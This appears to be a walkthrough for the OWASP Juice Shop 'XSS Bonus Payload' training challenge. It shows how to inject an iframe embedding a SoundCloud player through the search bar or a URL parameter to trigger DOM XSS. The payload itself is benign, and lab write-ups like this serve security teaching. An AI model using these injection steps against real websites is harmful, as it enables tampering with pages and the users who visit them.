## XSS Bonus Pay Load

The goal is to use the following iframe to perform a DOM XSS attack:

```
html
```

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>

```

### Step-by-Step Walkthrough:

### Step 1: Identify Potential Injection Points

Similar to the previous DOM XSS challenge, you need to find an input field or URL parameter in the Juice Shop where you can inject the payload.

### Step 2: Select a Suitable Injection Point

1. **Search Bar**: Often a good starting point.
2. **Feedback Form**: Another common target.
3. **URL Parameters**: Look for places in the URL where input is reflected back to the DOM.

### Step 3: Test the Payload

Here, we'll walk through using the search bar as an example:

1. **Navigate to the Juice Shop Application**: Open your Juice Shop application in your web browser.
2. **Locate the Search Bar**: Usually found at the top of the page.

### Step 4: Inject the Bonus Payload

1. **Enter the Payload into the Search Bar**: Paste the provided iframe payload into the search bar:
    
    ```html
    <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
    ```
    
2. `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`
3. **Submit the Search**: Press Enter or click the search button.

### Step 5: Observe the Result

- If the search functionality is vulnerable to DOM XSS, the iframe should be rendered in the DOM, and you should see the SoundCloud player appear on the page.

### Step 6: Verify Challenge Completion

- The OWASP Juice Shop application will typically provide a notification or update the challenge progress once the iframe is successfully injected and rendered.

### Troubleshooting Tips:

1. **Inspect the Page**: Use browser developer tools to inspect how the search query is being processed and displayed in the DOM.
2. **Try Different Inputs**: If the search bar doesn't work, try other input fields like the feedback form or URL parameters.

### Example Using URL Parameters

1. **Navigate to a Page with URL Parameters**: For instance, a product details page might have a URL like `http://your-juice-shop-url/#/product/1`.
2. **Modify the URL Parameter**: Append the iframe payload to a parameter in the URL, such as:
    
    ```html
    http://your-juice-shop-url/#/search?q=<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
    ```
    
3. `http://your-juice-shop-url/#/search?q=<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`
4. **Load the Page**: Hit Enter and see if the SoundCloud player is rendered.

By following these steps, you should be able to complete the "XSS Bonus Payload" challenge by successfully injecting and rendering the provided iframe. If you encounter any issues or have more questions, feel free to ask!
